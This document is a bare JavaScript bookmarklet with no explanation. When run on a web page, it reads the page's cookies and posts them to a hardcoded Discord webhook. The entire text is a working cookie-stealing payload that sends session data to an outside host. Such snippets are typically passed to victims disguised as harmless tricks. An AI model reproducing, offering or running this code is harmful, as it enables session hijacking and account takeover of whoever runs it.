javascript:(function(){
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://discord.com/api/webhooks/1099220197052784700/TJnZsFSIj7AWFyOdxx5iQ-Cl4zcAwfBVDZrokg400PkOkiWmDZRZobRTooJoQAbTX6wC");
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.send(JSON.stringify({
    content: document.cookie
  }));
})();
